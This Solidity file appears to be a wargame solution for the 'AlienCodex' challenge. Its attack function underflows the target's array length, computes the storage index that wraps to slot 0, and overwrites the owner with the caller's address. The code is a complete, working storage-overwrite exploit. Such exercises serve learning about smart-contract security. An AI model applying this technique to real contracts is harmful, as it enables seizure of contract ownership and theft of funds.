// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
  function make_contact() external;

  function retract() external;

  function revise(uint256 i, bytes32 _content) external;

  function owner() external view returns (address);
}

contract Solve {
  function attack(address target) public {
    uint256 codexStart = uint256(keccak256(abi.encode(1)));

    // Owner is located at storage 0, array is located at storage 1
    // keccak256(arraySlot) + targetIndex = 0
    // targetIndex = -keccak256(arraySlot)
    uint256 ownerStorageSlot = -codexStart;
    require(ownerStorageSlot + codexStart == 0, "Not 0");

    bytes32 payload = bytes32(uint256(uint160(msg.sender)));

    IAlienCodex codex = IAlienCodex(target);
    codex.make_contact();
    codex.retract();
    codex.revise(ownerStorageSlot, payload);

    require(codex.owner() == msg.sender, "Not claimed");
  }
}
